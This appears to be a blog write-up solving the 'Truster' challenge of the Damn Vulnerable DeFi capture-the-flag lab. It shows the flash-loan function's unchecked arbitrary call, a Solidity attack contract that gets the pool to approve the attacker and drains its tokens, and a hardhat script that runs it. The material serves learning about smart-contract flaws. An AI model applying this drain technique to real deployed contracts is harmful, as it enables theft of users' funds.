---
title: Damn vulnerable defi challenge3 truster
date: 2023-02-24 19:57:52
tags:
  - solidity
  - damnvulnerabledefi
  - defi
  - CTFs
categories:
  - solidity
---

## overview

More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

### how to get it started

1. git clone [github repo](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0)
2. yarn install
3. fill your code in \*.challenge.js
4. run your script via hardhat tools

## code bug

```javascript
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    // here.
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore)
        revert RepayFailed();

    return true;
}
```

Target here means address of the DVT token that we deployed before.Thus we can use this call to approve amount to attacker address.Let\'s jump into code:

```javascript
function attack(TrusterLenderPool pool,DamnValuableToken _token) external {
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)",address(this),type(uint256).max);
    pool.flashLoan(0,address(this),address(_token),data);
    _token.transferFrom(address(pool),msg.sender,_token.balanceOf(address(pool)));
}
```

Firstly, we need an abi string about the approve function.
Secondly,make a flash loan via pool address.
Finally,transfer all amount of pool DVT token to msg.sender(palyer).

### hardhat test script

```javascript
//deploy the attack contract
attack = await (
  await ethers.getContractFactory("TrusterAttack", player)
).deploy();
//invoke attack contract via player address.
await attack.connect(player).attack(pool.address, token.address);
```

- 1.deploy the attack contract
- 2.invoke attack contract via player address.
